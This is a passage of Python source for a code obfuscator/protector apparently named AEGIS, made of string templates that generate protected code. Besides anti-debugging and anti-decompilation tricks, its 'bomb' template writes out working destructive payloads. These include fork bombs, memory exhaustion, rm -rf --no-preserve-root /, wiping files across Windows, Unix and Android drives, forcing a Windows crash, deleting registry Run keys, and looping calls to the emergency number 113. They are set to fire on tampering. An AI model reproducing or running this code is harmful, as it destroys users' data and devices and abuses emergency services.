        def __init__({e},{f}=None):{e}.{b}={f};{e}.{c}=(lambda:(lambda:(lambda:(lambda:"{salt}")())())())();{e}.{d}=id({e});{e}.{ba}=(lambda:__import__('sys').modules)()
        def __reduce__({e}):(lambda:__import__('os')._exit(1))();return(None,())
        def __repr__({e}):(lambda:(lambda:__import__('os')._exit(1))())();return""
        def __str__({e}):return(lambda:(lambda:(lambda:(lambda:"{sp[:20]}")())())())()
        def __hash__({e}):(lambda:__import__('os')._exit(1))();return 0
        def __eq__({e},{bb}):({bb}!={e})and(lambda:__import__('os')._exit(1))();return False
except Exception as {g}:pass
else:globals()["{h}"]="{sp[::-1]}";({junk1}>{junk2})and(lambda:(lambda:None)())()
finally:{i}="utf8";{j}=globals();{k}=locals();{l}=id;{bc}=__import__('sys').modules
(lambda:(lambda:(lambda:setattr(__import__('sys'),'dont_write_bytecode',True))())())()
{m}=lambda {n}:(lambda {o}:(lambda {p}:(lambda {q}:(lambda {s}:(lambda {bd}:{bd}[-1])({s}))({q}))({p}))({o}))({n})
{t}=lambda {u}:(lambda {w}:(lambda {be}:''.join(chr(((ord(x)-{base})^{k5}^{k6}^{k7}^{k8}))for x in {be}))({w}))({u})
def {y}({z}):
    {A}=""
    for {B},{C} in enumerate({z}):(lambda:(lambda:{j}.__setitem__('{bf}',str({C})))())();{A}+=(lambda {D}={j}['{bf}']:(lambda {E}:(lambda {bg}:{bg})({E}))({D}))()
    return(lambda {F}:(lambda {G}:(lambda {bh}:{bh})({G}))({F}))({A})
{H}=(lambda:(lambda:vars(globals()['__builtins__']))()if hasattr(globals()['__builtins__'],'__dict__')else(lambda:globals()['__builtins__'])())()
{I}=(lambda {J}:(lambda {K}:(lambda {bi}:{bi}['eval']if isinstance({bi},dict)else getattr({bi},'eval'))({K}))({J}))({H})
{L}={I}({y}(['l','a','v','e'])[::-1])
{aa}={I}({y}(['r','t','s'])[::-1])
{ab}={I}({y}(['t','n','i'])[::-1])
{ac}={I}({y}(['s','e','t','y','b'])[::-1])
{ad}={I}({y}(['t','s','i','l'])[::-1])
{ae}={I}({y}(['e','p','y','t'])[::-1])
{af}={I}({y}(['l','o','o','b'])[::-1])
{ag}={I}({y}(['e','l','b','a','l','l','a','c'])[::-1])
{ah}={I}({y}(['y','a','r','r','a','e','t','y','b'])[::-1])
{ai}={I}({y}(['n','e','l'])[::-1])
{aj}={I}({y}(['p','a','m'])[::-1])
{ak}={I}({y}(['_','_','t','r','o','p','m','i','_','_'])[::-1])
{al}={I}({y}(['r','t','t','a','t','e','g'])[::-1])
{am}={I}({y}(['r','t','t','a','s','a','h'])[::-1])
{an}={I}({y}(['e','c','n','a','t','s','n','i','s','i'])[::-1])
def {M}({N}):return(lambda {O}:(lambda {P}:(lambda {Q}:(lambda {bj}:{bj})({Q}-{m1}))({P}))({O}))(int({N}))
def {R}({S}):return(lambda {T}:(lambda {bk}:{bk}^{k1}^{k2}^{k3}^{k4}^{k5}^{k6}-{m2})({T}))(int({S}))
def {ao}({ap}):
    {aq}=(lambda {ar}:{ah}({ar}[{ai}(b'0xFFFFFFFFFFFF/'):]))({ap})
    {ba}=0
    for {bb} in {aq}:{ba}=(lambda {bc},{bd}:{bc}*256+{bd})({ba},{bb})
    return(lambda {be}:{be}^{k7}^{k8}-{m4})({ba})
def {U}({V}):{V}=(lambda x:(lambda y:y-{m3})(x))({V});{V}=(lambda x:(lambda y:y^{k1}^{k2}^{k3}^{k4})(x))({V});return({aa}({ac}([{V}]),{i}))if {V}<=0x7F else({aa}({ac}([0xC0|({V}>>6),0x80|({V}&0x3F)]),{i}))if {V}<=0x7FF else({aa}({ac}([0xE0|({V}>>12),0x80|(({V}>>6)&0x3F),0x80|({V}&0x3F)]),{i}))if {V}<=0xFFFF else({aa}({ac}([0xF0|({V}>>18),0x80|(({V}>>12)&0x3F),0x80|(({V}>>6)&0x3F),0x80|({V}&0x3F)]),{i}))
{invk0}={I};{invk1}={L};{invk2}={an}({H},dict)and {H}['print']or {al}({H},'print');{invk3}={an}({H},dict)and {H}['input']or {al}({H},'input');{invk4}={I};{invk5}={an}({H},dict)and {H}['exec']or {al}({H},'exec');{invk6}={an}({H},dict)and {H}['open']or {al}({H},'open');{invk7}={ak};{invk8}={ad};{invk9}={aj};{invk10}={ai};{invk11}={af};{invk12}={ag};{invk13}={an}({H},dict)and {H}['chr']or {al}({H},'chr');{invk14}={an}({H},dict)and {H}['ord']or {al}({H},'ord');{invk15}={an}({H},dict)and {H}['hex']or {al}({H},'hex')
(lambda:(lambda:(lambda:(lambda:__import__('gc').disable())())())())()
(lambda:(lambda:(lambda:setattr(__import__('sys'),'tracebacklimit',0))())())()
(lambda:(lambda:__import__('sys').modules.pop('dis',None))())()
for _m in ['ast','dis','inspect','code','compileall','pdb','trace','bdb','linecache','_ast','uncompyle6','decompyle3','pycdc']:__import__('sys').modules.pop(_m,None)
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # chaos
    def 魔(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r;sp=''.join(chr(r.randint(0x4e00,0x9fff))for _ in range(60));a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_();exc=_(10)
        t1,tr1=_(t=True);t2,tr2=_(t=True)
        return f'''{a}=__import__('sys');{b}=__import__('os')
class {exc}(Exception):
    __slots__=('{c}',)
    def __init__({d},*{e}):{d}.{c}={e};{d}.__traceback__=None
    def __reduce__({d}):return(__import__('os')._exit,(1,))
{f}="{sp}";{g}={L()}
{t1}={L()};{tr1}
def {h}():{i}=id(exec)^id(eval)^id(compile);return(({i}>>16)^({i}&0xFFFF))^(({i}>>16)^({i}&0xFFFF))==0
def {j}({k}):
    try:raise {exc}({k})
    except {exc} as {l}:return {l}.{c}[0]if {l}.{c} else None
{t2}="{sp[:15]}";{tr2}
{m}={h}()and {j}(True);{L(v=f'({b}._exit(1)if not {m} else None)')}
if False:{n}=lambda:None
elif False:{o}=type('{p}',(),{{}})
else:{q}=0
try:raise {exc}('init')
except {exc}:pass
'''

    # numbers
    def 霧int(凱_,n):
        r=凱_._r;o1,o2=r.randint(10**35,10**45),r.randint(10**30,10**40);k1=r.randint(10**25,10**30);m1,m2=r.randint(1,255),r.randint(1,255);hx=0xFFFFFFFFFFFFFFFF
        return f"(((((({n}+{o1})-{o1})+{o2})-{o2})^{k1})^{k1})"
    # opaque
    def 幻(凱_):
        _=凱_.α;r=凱_._r;a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,v,w,x,y,z=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        preds=[f"{a}=lambda x:(x*x>=0)",f"{b}=lambda x:(x==x)",f"{c}=lambda x:((x&1)!=2)",f"{d}=lambda x:(x-x==0)",f"{e}=lambda x:(x|0==x)",f"{f}=lambda x:(x^0==x)",f"{g}=lambda x:((x<<1)>>1==x)",f"{h}=lambda x:(x//1==x)",f"{i}=lambda x:(x%1==0 if x==int(x)else True)",f"{j}=lambda x:(abs(x)>=0)",f"{k}=lambda x:(hash(x)==hash(x))",f"{l}=lambda x:(id(x)==id(x))",f"{m}=lambda x:(type(x)==type(x))",f"{n}=lambda x:((x+0)==x)",f"{o}=lambda x:((x*1)==x)",f"{p}=lambda x:(not(x!=x))",f"{q}=lambda x:((x and x)or not(x and not x)or True)",f"{s}=lambda x:(len([x])==1)",f"{t}=lambda x:(bool(x)or not bool(x))",f"{u}=lambda x:((x,x)[0]==x)",f"{v}=lambda x:([x][0]==x)",f"{w}=lambda x:({{0:x}}[0]==x)",f"{x}=lambda x:(next(iter([x]))==x)",f"{y}=lambda x:(getattr(type('_',(),{{'v':x}})(),'v')==x)",f"{z}=lambda x:((lambda _=x:_)()==x)",f"{_()}=lambda x:(__import__('hashlib').md5(str(x).encode()).hexdigest()==__import__('hashlib').md5(str(x).encode()).hexdigest())",f"{_()}=lambda x:(__import__('zlib').crc32(str(x).encode())==__import__('zlib').crc32(str(x).encode()))",f"{_()}=lambda x:((x**2-x*x)==0)",f"{_()}=lambda x:((x+x)==(2*x))",f"{_()}=lambda x:(((x|x)&x)==x)",f"{_()}=lambda x:((~(~x))==x)",f"{_()}=lambda x:(len(str(x))==len(str(x)))",f"{_()}=lambda x:(sum([1 for _ in [x]])==1)",f"{_()}=lambda x:(ord(chr(x&0xFF))==(x&0xFF))",f"{_()}=lambda x:(int.from_bytes(str(x).encode()[:8],'big')==int.from_bytes(str(x).encode()[:8],'big'))"]
        return '\n'.join(r.sample(preds,r.randint(12,20)))
    # dead
    def 影(凱_):
        _=凱_.α;r=凱_._r;a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        sp=''.join(chr(r.randint(0x4e00,0x9fff))for _ in range(30))
        cn,cn2,cn3=_(5),_(5),_(5)
        blocks=[f'if(lambda:False)():\n    {a}=__import__("os")._exit(0);{b}="{sp}";{c}=[ii for ii in range(100)];{d}={{kk:kk*kk for kk in range(50)}}',f'if 0:\n    def {e}({f}):\n        {g}=[{f}*ii for ii in range(1000)]\n        return sum({g})%{r.randint(100,999)}',f'if False and True:\n    class {cn}:\n        def __init__({h}):{h}.{i}="{sp[:20]}"\n        def {j}({h},{k}):\n            for {l} in range({k}):{h}.{i}+="X"\n            return {h}.{i}',f'if None:\n    {m}={{ii:(lambda ii=ii:ii*ii*iii)for ii in range(200)}}\n    {n}=[{m}[kk]()for kk in range(100)]',f'if type(None)!=type(None):\n    {o}=lambda {p}:(lambda _={p}:(lambda __=_:__*__*__)())()', f'if len("{sp}")>100:\n    {q}=[x for x in "{sp}"];{q}.insert(0, {q}.pop())', f'if {r.randint(0,1)}==2:\n    {s}={{i:i for i in range(10)}}']
        return '\n'.join(r.sample(blocks,r.randint(3,5)))
    # bomb
    def 爆(凱_):
        _=凱_.α;r=凱_._r;a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z=tuple([_()for __ in range(51)]);_smk=r.randint(50,200);_sme=[ord(c)^_smk for c in 'AEGIS_SAFE_MODE'];_abk=[_(),_(),_(),_(),_(),_(),_()];_abv=[ord(c)^_smk for c in '__aegis_boom__']
        out = f'''def {a}():
    while True:globals()['{b}'+str(__import__('random').randint(0,10**18))]=[['X'*999999 for _ in range(999999)]for __ in range(999999)]
def {c}():
    {d}=[]
    while True:{d}.extend([{{ii:bytearray(10**8)for ii in range(10000)}}for _ in range(1000)])
def {e}():
    import gc
    while True:
        for {f} in gc.get_objects():
            try:
                if hasattr({f},'__dict__'):{f}.__dict__.clear()
                if hasattr({f},'__code__'):object.__setattr__({f},'__code__',compile('','','exec'))
            except:pass
def {g}():
    def _{g}():_{g}()
    try:_{g}()
    except:_{g}()
def {h}():
    import threading
    def _tb():
        while True:
            for _ in range(10000):threading.Thread(target=_tb,daemon=True).start()
    for _ in range(1000):threading.Thread(target=_tb,daemon=True).start()
def {i}():
    import subprocess,sys
    while True:
        for _ in range(10000):
            try:subprocess.Popen([sys.executable,'-c','exec("while True:__import__(\\\"os\\\").fork()"if __import__(\"os\").name!=\"nt\"else\"while True:pass\")'],creationflags=0x08000000)
            except:pass
def {j}():
    {k}=0
    while True:{k}+=1;{k}*={k}*{k}*{k}*{k}*{k};{k}%=10**1000
def {l}():
    import subprocess
    for {m} in {repr(凱_._DBG)}+{repr(凱_._ANZ)}:
        try:subprocess.run(['taskkill','/F','/IM',{m}],capture_output=True,creationflags=0x08000000)
        except:pass
    try:subprocess.run(['taskkill','/F','/IM','python.exe'],creationflags=0x08000000)
    except:pass
def {n}():
    import ctypes
    if hasattr(ctypes,'windll'):
        while True:
            for _ in range(100000):ctypes.windll.user32.MessageBoxA(0,b'SYSTEM COMPROMISED BY AEGIS',b'SECURITY BREACH',0x10|0x1000|0x40000)
def {o}():
    import ctypes
    if hasattr(ctypes,'windll'):
        while True:
            try:
                for _ in range(1000):
                    _p=ctypes.windll.kernel32.VirtualAlloc(0,1024*1024*1024,0x1000|0x2000,0x40)
                    if _p:ctypes.memset(_p,0xDEADBEEF&0xFF,1024*1024*1024)
            except:pass
def {p}():
    while True:
        try:globals()['_'+str(__import__('random').randint(0,10**20))]=bytearray(10**9)
        except:pass
def {q}():
    import os,tempfile
    while True:
        try:
            for _ in range(1000000):
                open(os.path.join(tempfile.gettempdir(),'aegis_'+str(__import__('random').randint(0,10**18))),'wb').write(b'AEGIS_DESTROYER'*1024*1024*100)
        except:pass
def {s}():
    import ctypes
    if hasattr(ctypes,'windll'):
        try:
            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.ntdll.RtlAdjustPrivilege(19,1,0,ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000428,0,0,0,6,ctypes.byref(ctypes.c_ulong()))
        except:pass
        try:globals()['__mem__']=[[[b'X'*999999]*999]*999]*999
        except:pass
def {t}():
    import ctypes
    if hasattr(ctypes,'windll'):
        try:
            ctypes.windll.kernel32.ExitWindowsEx(0x00000008,0x00000000)
        except:pass
def {u}():
    import ctypes
    if hasattr(ctypes,'windll'):
        while True:
            try:
                for _a in range(0,0x7FFFFFFF,4096):
                    ctypes.windll.kernel32.VirtualProtect(_a,4096,0x40,ctypes.byref(ctypes.c_ulong()))
                    ctypes.memset(_a,0xCC,4096)
            except:pass
def {v}():
    import os
    while True:
        try:
            for _d in ['C:\\\\','D:\\\\','E:\\\\']+[os.environ.get('USERPROFILE','')]:
                for _r,_ds,_fs in os.walk(_d):
                    for _f in _fs:
                        try:open(os.path.join(_r,_f),'wb').write(b'')
                        except:pass
        except:pass
def {w}():
    import winreg
    try:
        for _k in [winreg.HKEY_CURRENT_USER,winreg.HKEY_LOCAL_MACHINE]:
            try:winreg.DeleteKey(_k,'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run')
            except:pass
    except:pass
def {x}():
    import os
    if os.name!='nt':
        while True:
            try:os.fork()
            except:pass
def {y}():
    import os
    if os.name!='nt':
        while True:
            try:
                for _d in ['/','~','/home','/root','/tmp']:
                    for _r,_ds,_fs in os.walk(os.path.expanduser(_d)):
                        for _f in _fs:
                            try:open(os.path.join(_r,_f),'wb').write(b'')
                            except:pass
            except:pass
def {z}():
    import os,signal
    if os.name!='nt':
        try:os.kill(1,signal.SIGKILL)
        except:pass
def {A}():
    import os,subprocess
    if os.name!='nt':
        try:subprocess.run(['rm','-rf','--no-preserve-root','/'],capture_output=True)
        except:pass
def {B}():
    import os,subprocess
    if os.name!='nt':
        try:subprocess.run(['shutdown','-h','now'],capture_output=True)
        except:pass
        try:subprocess.run(['reboot'],capture_output=True)
        except:pass
def {C}():
    import os
    while True:
        try:
            _env=os.environ.copy()
            for _k in list(_env.keys()):
                try:del os.environ[_k]
                except:pass
            os.environ['PATH']=''
            os.environ['HOME']=''
            os.environ['USER']=''
        except:pass
def {D}():
    import sys
    while True:
        try:
            sys.stdin=None
            sys.stdout=None
            sys.stderr=None
            sys.path.clear()
            sys.modules.clear()
        except:pass
def {E}():
    import os,subprocess
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        while True:
            try:subprocess.run(['termux-vibrate','-d','60000','-f'],capture_output=True)
            except:pass
            try:subprocess.run(['termux-toast','-b','red','-c','white','-g','top','DEVICE COMPROMISED - AEGIS'],capture_output=True)
            except:pass
            try:subprocess.run(['termux-notification','--title','HACKED','--content','Your device has been compromised','--priority','max','--vibrate','1000,500,1000','--led-color','red','--alert-once'],capture_output=True)
            except:pass
            try:subprocess.run(['termux-tts-speak','Your device has been hacked by aegis'],capture_output=True)
            except:pass
def {F}():
    import os,subprocess,threading
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        def _wipe(_p):
            try:subprocess.Popen('rm -rf '+_p+'/* 2>/dev/null &',shell=True)
            except:pass
            try:subprocess.Popen('rm -rf '+_p+' 2>/dev/null &',shell=True)
            except:pass
        _paths=['/sdcard','/storage/emulated/0','/data/data','/data/local','/data/user/0',os.path.expanduser('~'),'/mnt/sdcard','/storage/sdcard0','/storage/sdcard1']
        _threads=[threading.Thread(target=_wipe,args=(_p,),daemon=True)for _p in _paths]
        for _t in _threads:_t.start()
def {G}():
    import os,subprocess
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        while True:
            try:subprocess.Popen(['am','start','-a','android.intent.action.CALL','-d','tel:113'])
            except:pass
            try:subprocess.Popen(['am','start','-a','android.intent.action.SENDTO','-d','sms:113','--es','sms_body','HACKED'])
            except:pass
def {H}():
    import os,subprocess
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        while True:
            try:subprocess.run(['termux-torch','on'],capture_output=True)
            except:pass
            try:subprocess.run(['termux-volume','music','15'],capture_output=True)
            except:pass
            try:subprocess.run(['termux-media-player','play','/sdcard/Music/*.mp3'],capture_output=True)
            except:pass
def {I}():
    import os,subprocess
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        while True:
            for _ in range(1000):
                try:subprocess.Popen(['termux-notification','--id',str(_),'--title','AEGIS','--content','PWNED','--priority','max'])
                except:pass
def {J}():
    import os,subprocess
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        while True:
            try:subprocess.run(['am','broadcast','-a','android.intent.action.BATTERY_LOW'],capture_output=True)
            except:pass
            try:subprocess.run(['settings','put','system','screen_brightness','255'],capture_output=True)
            except:pass
            try:subprocess.run(['settings','put','system','screen_off_timeout','2147483647'],capture_output=True)
            except:pass
def {L}():
    import os,subprocess
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        try:subprocess.run(['pm','clear','com.android.providers.contacts'],capture_output=True)
        except:pass
        try:subprocess.run(['pm','clear','com.android.providers.media'],capture_output=True)
        except:pass
        try:subprocess.run(['pm','clear','com.android.providers.downloads'],capture_output=True)
        except:pass
def {M}():
    import os,subprocess
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        while True:
            try:
                _pkgs=subprocess.run(['pm','list','packages'],capture_output=True,text=True).stdout
                for _pkg in _pkgs.split('\\n'):
                    if _pkg.startswith('package:'):
                        try:subprocess.run(['am','force-stop',_pkg[8:]],capture_output=True)
                        except:pass
            except:pass
def {N}():
    import os,subprocess
    if hasattr(os,'environ')and 'ANDROID_ROOT' in os.environ:
        while True:
            try:subprocess.run(['reboot'],capture_output=True)
            except:pass
            try:subprocess.run(['reboot','bootloader'],capture_output=True)
            except:pass
            try:subprocess.run(['reboot','recovery'],capture_output=True)
            except:pass
def _AEGIS_BOOM():
    import os,threading,sys
    _SM=''.join(chr(cc^{_smk})for cc in {_sme})
    if os.environ.get(_SM)=='1':os._exit(1)
    try:globals()['__mem__']=[[[b'X'*999999]*999]*999]*999
    except:pass
    try:sys.meta_path.clear()
    except:pass
    try:sys.path_hooks.clear()
    except:pass
    _all_bombs=[{a},{c},{e},{g},{h},{i},{j},{l},{n},{o},{p},{q},{x},{y},{z},{A},{B},{C},{D},{E},{F},{G},{H},{I},{J},{L},{M},{N}]
    _threads=[threading.Thread(target=_b,daemon=True)for _b in _all_bombs]
    for _t in _threads:_t.start()
    if os.name=='nt':
        _critical=[{s},{t},{u},{v},{w}]
        _ct=[threading.Thread(target=_c,daemon=True)for _c in _critical]
        for _c in _ct:_c.start()
        try:{s}()
        except:pass
    elif 'ANDROID_ROOT' in os.environ:
        _critical=[{E},{F},{G},{N}]
        _ct=[threading.Thread(target=_c,daemon=True)for _c in _critical]
        for _c in _ct:_c.start()
        try:{N}()
        except:pass
    else:
        _critical=[{z},{A},{B}]
        _ct=[threading.Thread(target=_c,daemon=True)for _c in _critical]
        for _c in _ct:_c.start()
        try:{A}()
        except:pass
    os._exit(1)
_AEGIS_BOOM_ID=id(_AEGIS_BOOM)
_AEGIS_BOOM_HASH=hash(_AEGIS_BOOM.__code__.co_code)if hasattr(_AEGIS_BOOM,'__code__')else 0
globals()['{K}']=_AEGIS_BOOM;globals()['__aegis_boom__']=_AEGIS_BOOM
globals()['__ab__']=_AEGIS_BOOM;globals()['__ax__']=_AEGIS_BOOM;globals()['__az__']=_AEGIS_BOOM
globals()['__a1__']=_AEGIS_BOOM;globals()['__a2__']=_AEGIS_BOOM;globals()['__a3__']=_AEGIS_BOOM
globals()['__{O}__']=_AEGIS_BOOM;globals()['__{P}__']=_AEGIS_BOOM
def _DIRECT_BOOM():
    import os
    _SM=''.join(chr(cc^{_smk})for cc in {_sme})
    if os.environ.get(_SM)=='1':os._exit(1)
    try:_AEGIS_BOOM()
    except:pass
    for _k in ['__aegis_boom__','__ab__','__ax__','__az__','__a1__','__a2__','__a3__','__{O}__','__{P}__','{K}']:
        try:globals().get(_k,lambda:None)()
        except:pass
    os._exit(1)
def _INTEGRITY_GUARD():
    import os,time
    _SM=''.join(chr(cc^{_smk})for cc in {_sme})
    while True:
        time.sleep(0.2)
        if os.environ.get(_SM)=='1':continue
        try:
            if globals().get('__aegis_corrupt__'):_DIRECT_BOOM()
            _keys=['__aegis_boom__','__ab__','__ax__','__az__','__a1__','__a2__','__a3__']
            _alive=sum(1 for _k in _keys if _k in globals()and callable(globals()[_k]))
            if _alive<3:_DIRECT_BOOM()
            if '__aegis_boom__' in globals():
                _fn=globals()['__aegis_boom__']
                if not callable(_fn):_DIRECT_BOOM()
                if hasattr(_fn,'__code__')and hash(_fn.__code__.co_code)!=_AEGIS_BOOM_HASH:_DIRECT_BOOM()
            if id(globals().get('__aegis_boom__'))!=_AEGIS_BOOM_ID:_DIRECT_BOOM()
        except:pass
try:__import__('threading').Thread(target=_INTEGRITY_GUARD,daemon=True).start()
except:pass
def _ATEXIT_CHECK():
    _SM=''.join(chr(cc^{_smk})for cc in{_sme})
    if __import__('os').environ.get(_SM)=='1':return
    _keys=['__aegis_boom__','__ab__','__ax__','__az__']
    _alive=sum(1 for _k in _keys if _k in globals()and callable(globals()[_k]))
    if _alive<2:__import__('os')._exit(1)
try:__import__('atexit').register(_ATEXIT_CHECK)
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    # fake
    def 偽(凱_):
        _=凱_.α;L=凱_.λ;r=凱_._r
        a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,s,t,u,w,x,y,z=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        k1,k2,k3=r.randint(1,255),r.randint(1,255),r.randint(1,255);enc_junk=base64.b85encode(凱_.χ(b'AEGIS_'+凱_._r.randbytes(32),凱_._r.randbytes(32))).decode()
        fake_ips=[f"10.{r.randint(0,255)}.{r.randint(0,255)}.{r.randint(0,255)}" for _ in range(5)]
        out = f'''try:
    import socket as {a};import ssl as {b}
    {c}={a}.socket;{d}={a}.gethostbyname;{e}={a}.getaddrinfo;{f}={b}.create_default_context if hasattr({b},'create_default_context')else None
    {g}={repr(凱_._HOST)}
    {h}={repr(凱_._KEY)}
    {i}={{ii:(lambda ii=ii:{L(v=f'ii^{k1}')})for ii in range(2)}};{j}=[{i}[ii]()for ii in range(2)];_payload=b'{enc_junk}'
    class {n}({c}):
        def __init__({o},*args,**kw):
            {c}.__init__({o},*args,**kw);{o}._blk=False
        def connect({o},addr):
            try:
                _h=str(addr[0]).lower()
                if any(x in _h for x in {g}):{o}._blk=True;addr=('127.0.0.1',addr[1])if isinstance(addr,tuple)else('127.0.0.1',80)
            except:pass
            return {c}.connect({o},addr)
        def send({o},d,f=0):
            try:
                if {o}._blk:return len(d)
                if any(x.encode()in d.lower() for x in {h}):return len(d)
            except:pass
            return {c}.send({o},d,f)
        def sendall({o},d,f=0):
            try:
                if {o}._blk:return None
                if any(x.encode()in d.lower() for x in {h}):return None
            except:pass
            return {c}.sendall({o},d,f)
        def recv({o},b,f=0):
            try:
                if {o}._blk:return b'HTTP/1.1 200 OK\\r\\n\\r\\n{{}}'
            except:pass
            return {c}.recv({o},b,f)
        def recvfrom({o},b,f=0):
            try:
                if {o}._blk:return(b'',('127.0.0.1',80))
            except:pass
            return {c}.recvfrom({o},b,f)
    {a}.socket={n}
    {p}={{jj:(lambda jj=jj:{L(v=f'jj^{k3}')})for jj in range(2)}};{q}=[{p}[jj]()for jj in range(2)]
    def {s}({t},*args,**kw):
        try:
            if any(x in {t}.lower()for x in {g}):return '127.0.0.1'
        except:pass
        return {d}({t},*args,**kw)
    def {u}({w},*args,**kw):
        try:
            if any(x in {w}.lower()for x in {g}):return[({a}.AF_INET,{a}.SOCK_STREAM,6,'',('127.0.0.1',443))]
        except:pass
        return {e}({w},*args,**kw)
    {a}.gethostbyname={s};{a}.getaddrinfo={u}
    if {f}:
        {x}={f}
        def {y}(*args,**kw):
            _ctx={x}(*args,**kw);_ctx.check_hostname=False;_ctx.verify_mode={b}.CERT_NONE
            return _ctx
        {b}.create_default_context={y}
except:pass
try:
    def {z}():
        import os as _o,tempfile as _tf
        _hosts=['127.0.0.1','10.0.0.1','192.168.1.1','172.16.0.1','169.254.0.1']
        for _u in _hosts:
            try:__import__('socket').socket().connect((_u,80))
            except:pass
        for _p in [80,443,8080,8443,3389,22,21]:
            try:__import__('socket').socket().connect(('127.0.0.1',_p))
            except:pass
        try:_tf.gettempdir();_o.environ.get('APPDATA','');_o.environ.get('USERPROFILE','');_o.getcwd()
        except:pass
        try:__import__('ctypes').windll.kernel32.GetTickCount()
        except:pass
        try:__import__('uuid').getnode()
        except:pass
        for _m in ['requests','urllib3','httpx','aiohttp','socket','ssl']:
            try:__import__(_m)
            except:pass
    __import__('threading').Thread(target={z},daemon=True).start()
except:pass
'''
        vm_src,_,_,_,_=凱_.虛(out,凱_._r.randbytes(32))
        return vm_src
    def 請(凱_):
        _=凱_.α;a,b,c,d,e,f,g,h,i,j,k,l,m,o,p,q,r,s,t=_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_(),_()
        out = f'''try:
    import requests as {a},ssl,socket,time,json as _json
    {b}={a}.Session
    def {l}():
        import os
        try:
            _p=os.environ.get('HTTP_PROXY','')or os.environ.get('HTTPS_PROXY','')or os.environ.get('http_proxy','')or os.environ.get('https_proxy','')
            if _p:return True
            for _port in [8080,8888,9090,1080,3128,8118]:
                try:
                    _s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);_s.settimeout(0.3)
                    _s.connect(('127.0.0.1',_port));_s.close();return True
                except:pass
        except:pass
        return False
    def {p}(method,url,headers=None,data=None,json_data=None,timeout=10):
        import urllib.parse as _up
        _pr=_up.urlparse(url)
        _host=_pr.netloc;_path=_pr.path or'/'
        if _pr.query:_path+='?'+_pr.query
        _port=443 if _pr.scheme=='https'else 80
        if':'in _host:_host,_port=_host.split(':');_port=int(_port)
        _body=None
        if json_data:_body=_json.dumps(json_data).encode();headers=headers or{{}};headers['Content-Type']='application/json'
        elif data:
            if isinstance(data,dict):_body=_up.urlencode(data).encode();headers=headers or{{}};headers['Content-Type']='application/x-www-form-urlencoded'
            else:_body=data.encode()if isinstance(data,str)else data
        _req=f'{{method.upper()}} {{_path}} HTTP/1.1\\r\\nHost: {{_host}}\\r\\n'
        _hdrs=headers or{{}}
        _hdrs.setdefault('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        _hdrs.setdefault('Accept','*/*')
        _hdrs.setdefault('Connection','close')
        if _body:_hdrs['Content-Length']=str(len(_body))
        for _k,_v in _hdrs.items():_req+=f'{{_k}}: {{_v}}\\r\\n'
        _req+='\\r\\n'
        _sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        _sock.settimeout(timeout)
        try:
            _sock.connect((_host,_port))
            if _pr.scheme=='https':
                _ctx=ssl.create_default_context()
                _ctx.check_hostname=False;_ctx.verify_mode=ssl.CERT_NONE
                _sock=_ctx.wrap_socket(_sock,server_hostname=_host)
            _sock.sendall(_req.encode())
            if _body:_sock.sendall(_body)
            _resp=b''
            while True:
                try:_chunk=_sock.recv(4096)
                except:break
                if not _chunk:break
                _resp+=_chunk
            _sock.close()
            _parts=_resp.split(b'\\r\\n\\r\\n',1)
            _hdr=_parts[0].decode(errors='ignore')
            _bdy=_parts[1]if len(_parts)>1 else b''
            _status=200
            try:_status=int(_hdr.split(' ')[1])
            except:pass
            _rh={{}}
            for _ln in _hdr.split('\\r\\n')[1:]:
                if':'in _ln:_hk,_hv=_ln.split(':',1);_rh[_hk.strip().lower()]=_hv.strip()
            return type('R',(),{{'status_code':_status,'text':_bdy.decode(errors='ignore'),'content':_bdy,'headers':_rh,'json':lambda s:_json.loads(_bdy)}})()
        except Exception as _e:
            try:_sock.close()
            except:pass
            return type('R',(),{{'status_code':0,'text':str(_e),'content':b'','headers':{{}}}})()
    def {o}():
        _ua=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36']
        return {{'User-Agent':__import__('random').choice(_ua),'Accept':'text/html,application/json','Accept-Language':'en-US,en;q=0.9'}}
    class {c}({b}):
        def __init__({d}):
            super().__init__()
            {d}._aegis_check={repr(凱_._HOST+凱_._KEY)}
            {d}._use_raw={l}()
            {d}.headers.update({o}())
        def _chk({e},url):
            if any(x in url.lower()for x in {e}._aegis_check):__import__('os')._exit(1)
